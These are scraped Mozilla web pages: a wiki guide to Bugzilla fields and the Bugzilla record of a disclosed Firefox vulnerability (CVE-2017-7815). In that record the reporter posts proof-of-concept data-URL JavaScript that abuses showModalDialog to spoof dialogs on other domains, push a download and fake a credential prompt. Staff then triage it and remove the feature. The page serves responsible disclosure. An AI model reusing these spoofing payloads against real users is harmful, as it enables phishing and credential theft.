## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from wiki.mozilla.org_3659d679_20250126_104321.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_b29ad53a_20250125_174642.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1368981)
* [XML](/show_bug.cgi?ctype=xml&id=1368981)

Closed
[Bug 1368981](/show_bug.cgi?id=1368981)
(CVE-2017-7815)

Opened 8 years ago
Closed 7 years ago

# Firefox allows you to insert modal dialog in any domain

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Firefox allows you to insert modal dialog in any domain

## Categories

### (Core :: DOM: Core & HTML, defect, P2)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML#DOM%3A%20Core%20%26%20HTML)

DOM: Core & HTML
▾

Core :: DOM: Core & HTML
Issues in DOM tree [https://dom.spec.whatwg.org](https://dom.spec.whatwg.org/) & HTML [https://html.spec.whatwg.org](https://html.spec.whatwg.org/) that do not fit into any other DOM or HTML component or which span multiple DOM or HTML components.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P2

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |
| Webcompat Score | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr52 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=wontfix) |
| firefox55 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=wontfix) |
| firefox56 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed) |
| firefox57 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox57&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr52 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox55 |  | wontfix |
| firefox56 |  | fixed |
| firefox57 |  | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jm.acuna73, Assigned: mrbkap)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/89d2149736265010bfe669ce8c3075c0?d=mm&size=40)  [mrbkap](/user_profile?user_id=69426)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/02cd33b7820f5355d38f6d67aa0cc366?d=mm&size=40)  [jm.acuna73](/user_profile?user_id=557326)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/5111b810214a00377104f5ad3efefa26?d=mm&size=40)  [sefeng](/user_profile?user_id=625922)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

11 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2017-7791](/show_bug.cgi?id=1365875 "RESOLVED FIXED - Firefox allows you to insert confirm/alert/prompt dialog in any domain")

## Details

### (Keywords: reporter-external, sec-moderate, Whiteboard: [adv-main56+][post-critsmash-triage] Fixed by removing ShowModalDialog in bug 981796)

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2017-7815

[Keywords:](/describekeywords.cgi)

[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main56+][post-critsmash-triage] Fixed by removing ShowModalDialog in bug 981796

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a8409869_1689 "8 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | [qe-verify](#a9551370_452604 "7 years ago") | - |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file)

| [Download file from any site](/attachment.cgi?id=8875192)  [8 years ago](#c5)  [Jose María Acuña](/user_profile?user_id=557326)   3.39 MB, video/webm |  | [Details](/attachment.cgi?id=8875192&action=edit) |
| --- | --- | --- |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Jose María Acuña](/user_profile?user_id=557326)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1368981#c0)• 8 years ago |
|  | |

User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Steps to reproduce:
1- Go to:
data:text/html,<script>function loadIframe() {win = open('','\_top');win.document.open();win.document.write('data:text/html,<s'+'cript>location="<https://www.google.com>";</s'+'cript>');win.document.close();}function go() {var iframe = '<iframe onload="loadIframe();"></iframe>';document.body.innerHTML = iframe; showModalDialog('<https://www.firefox.com','','dialogWidth=600;dialogHeight=600>');}</script><input type="button" onclick="go()" value="test"/>
2- Click button
Bug detected in Firefox browsers that do not use multi-process architecture or e10s
Tested in:
Firefox Nightly 55.0a1 (2017-05-17) (64-bit)
Firefox Developer Edition 54.0a2 (2017-04-18) (32-bits)
Firefox 53.0.2 (32-bit)
Note:
I consider that it is not a variant of the bug with id 1365875 because the showModalDialog method is not part of the three types of native popup boxes in javascript

|  | [Jose María Acuña](/user_profile?user_id=557326)  Reporter |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a54_557326)• 8 years ago |

Group: firefox-core-security

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a14685_75935)• 8 years ago |

Group: firefox-core-security → dom-core-securityComponent: Untriaged → DOMProduct: Firefox → CoreVersion: 55 Branch → unspecified

|  | [Jose María Acuña](/user_profile?user_id=557326)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1368981#c1)• 8 years ago |
|  | |

You could use the showModalDialog method to download a file from an unauthorized domain.
Example:
data:text/html,<input type="button" onclick="go()" value="test"/><script>
function loadIframe() {
var win = open('','\_top');
win.document.open();
win.document.write('data:text/html,<s'+'cript>location = \'<https://www.google.com>\';</s'+'cript>');
win.document.close();
}
function go() {
var iframe = '<iframe style="border:0;height:0;width:0" onload="loadIframe();"></iframe>';
document.body.innerHTML += iframe;
window.showModalDialog('[http://d.7-zip.org/a/7z1700.exe',window,'dialogWidth=100px;dialogHeight:100px](http://d.7-zip.org/a/7z1700.exe%27%2Cwindow%2C%27dialogWidth%3D100px;dialogHeight:100px)');
}
</script>

|  | [Jose María Acuña](/user_profile?user_id=557326)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1368981#c2)• 8 years ago |
|  | |

And it could even steal the credentials of an unsuspecting user.
Go to:
data:text/html,<input type="button" onclick="go()" value="test"/>
<script>
function loadIframe() {
var win = open('','\_top');
win.document.open();
win.document.write('data:text/html,<s'+'cript>location = \'<https://mail.google.com>\';</s'+'cript>');
win.document.close();
}
function go() {
var iframe = '<iframe style="border:0;height:0;width:0" onload="loadIframe();"></iframe>';
document.body.innerHTML = iframe;
window.showModalDialog('data:text/html,<h3>Loadig...</h3><input type="button" value="Accept" onclick="window.close()"/>',window,'dialogWidth=100px;dialogHeight:100px');
location = '<http://feeds.feedburner.com/GoogleInbox>';
}
</script>

|  | [Andrew Overholt [:overholt]](/user_profile?user_id=442218) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1368981#c3)• 8 years ago |
|  | |

We're removing showModalDialog with e10s (in [bug 981796](/show_bug.cgi?id=981796 "RESOLVED FIXED - Remove window.showModalDialog")), right, Blake?Flags: needinfo?(mrbkap)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1368981#c4)• 8 years ago |
|  | |

(In reply to Andrew Overholt [:overholt] from [comment #3](/show_bug.cgi?id=1368981#c3 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain"))
> We're removing showModalDialog with e10s (in [bug 981796](/show_bug.cgi?id=981796 "RESOLVED FIXED - Remove window.showModalDialog")), right, Blake?
showModalDialog isn't supported with e10s, and [comment 0](/show_bug.cgi?id=1368981#c0 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain") says this doesn't affect e10s.
We looked at this in sec triage, and it seemed like a fairly convincing spoof.

|  | [Jose María Acuña](/user_profile?user_id=557326)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1368981#c5)• 8 years ago |
|  | |

Attached video
[Download file from any site](attachment.cgi?id=8875192)
— [Details](attachment.cgi?id=8875192&action=edit)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a616973_159069)• 8 years ago |

See Also: → [CVE-2017-7791](/show_bug.cgi?id=1365875 "RESOLVED FIXED - Firefox allows you to insert confirm/alert/prompt dialog in any domain")

|  | [Blake Kaplan (:mrbkap) (inactive)](/user_profile?user_id=69426)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1368981#c6)• 8 years ago |
|  | |

Let's just turn off showModalDialog for everybody. It'll be behind a pref for a bit and we'll remove the code soon after.

|  | [Blake Kaplan (:mrbkap) (inactive)](/user_profile?user_id=69426)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a650655_69426)• 8 years ago |

Flags: needinfo?(mrbkap)

|  | [Andrew Overholt [:overholt]](/user_profile?user_id=442218) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1368981#c7)• 8 years ago |
|  | |

I was thinking we'd eventually get e10s to 100% but [comment 6](/show_bug.cgi?id=1368981#c6 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain") works for me. I'm assuming we'll just do that in [bug 981796](/show_bug.cgi?id=981796 "RESOLVED FIXED - Remove window.showModalDialog").

|  | [Andrew Overholt [:overholt]](/user_profile?user_id=442218) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1368981#c8)• 8 years ago |
|  | |

And Blake sent email: <https://groups.google.com/forum/#!msg/mozilla.dev.platform/4t5AAxxrCoA/hFXL2HsGBwAJ>

|  | [Andrew Overholt [:overholt]](/user_profile?user_id=442218) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a656373_442218)• 8 years ago |

Priority: -- → P2

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a716922_452604)• 8 years ago |

Keywords: [sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a4090337_280903)• 8 years ago |

Flags: sec-bounty?

|  | [Jose María Acuña](/user_profile?user_id=557326)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1368981#c9)• 7 years ago |
|  | |

Hi,
I do not know what exactly means "bug which should be worked on in the next release/iteration"
but I have checked that it is reproduced in:
- Firefox 55.0.3 (32-bit)
- Firefox ESR 52.3.0 (64-bit)
It is not reproduced in:
- Firefox Developer Edition 56.0b3 (32-bits)
- Firefox Nightly 57.0a1 (2017-08-28) (64-bit)
Tested in Firefox browsers that do not use multi-process architecture or e10s.
(I used the html code from [Comment 2](/show_bug.cgi?id=1368981#c2 "RESOLVED FIXED - Firefox allows you to insert modal dialog in any domain"))

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1368981#c10)• 7 years ago |
|  | |

This was fixed via [bug 981796](/show_bug.cgi?id=981796 "RESOLVED FIXED - Remove window.showModalDialog"), which removed showModalDialog.Assignee: nobody → mrbkapStatus: UNCONFIRMED → RESOLVEDClosed: 7 years ago
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=wontfix)
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed)
[status-firefox57](/buglist.cgi?f1=cf_status_firefox57&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox57&o1=equals&v1=fixed)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=wontfix)Resolution: --- → FIXED

|  | [Jose María Acuña](/user_profile?user_id=557326)  Reporter |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1368981#c11)• 7 years ago |
|  | |

I understand now :)
Thank you!

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a8409869_1689)• 7 years ago |

Flags: sec-bounty? → sec-bounty+Whiteboard: Fixed by removing ShowModalDialog in bug 981796

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a8509058_1689)• 7 years ago |

Group: dom-core-security → core-security-release

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a9210363_280903)• 7 years ago |

Alias: CVE-2017-7815Whiteboard: Fixed by removing ShowModalDialog in bug 981796 → [adv-main56+] Fixed by removing ShowModalDialog in bug 981796

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a9551370_452604)• 7 years ago |

Flags: qe-verify-Whiteboard: [adv-main56+] Fixed by removing ShowModalDialog in bug 981796 → [adv-main56+][post-critsmash-triage] Fixed by removing ShowModalDialog in bug 981796

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a21307101_1689)• 7 years ago |

Group: core-security-release

|  | [Nobody; OK to take it and work on it](/user_profile?user_id=1) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a56256906_1)• 6 years ago |

Component: DOM → DOM: Core & HTML

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1368981#a220859220_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1368981&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Jose María Acuña](/user_profile?user_id=557326)

Created:
